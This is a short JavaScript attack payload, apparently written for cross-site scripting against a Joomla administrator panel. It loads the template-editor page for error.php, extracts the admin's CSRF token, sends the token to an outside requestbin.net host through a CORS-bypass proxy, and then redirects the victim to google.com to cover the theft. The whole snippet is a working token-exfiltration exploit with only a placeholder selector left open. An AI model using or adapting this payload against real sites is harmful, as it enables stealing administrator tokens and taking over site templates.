/* 
	Get csrf token
*/
var xhttp = new XMLHttpRequest();
var response1 = "";
xhttp.onreadystatechange = function() {
	if (this.readyState == 4 && this.status == 200) {
		response1 = this.responseText;
	}
};
xhttp.open("GET", "/administrator/index.php?option=com_templates&view=template&id=506&file=L2Vycm9yLnBocA", false); //asynchronous false: need to get whole response text for next step
xhttp.send();
var parser = new DOMParser();
var xmlDoc = parser.parseFromString(response1, 'text/html'); //Firefox: text/html, Chrome: text/xml
var token = xmlDoc.querySelector('<selector for csrf token>').name;

//Send token, bypass CORS
xhttp.open("GET", "https://cors-anywhere.herokuapp.com/http://" + token + ".3bdafcbfdbe622c26e7d.d.requestbin.net");
xhttp.send();

/* redirect */
<meta http-equiv="refresh" content="0;URL=http://google.com">
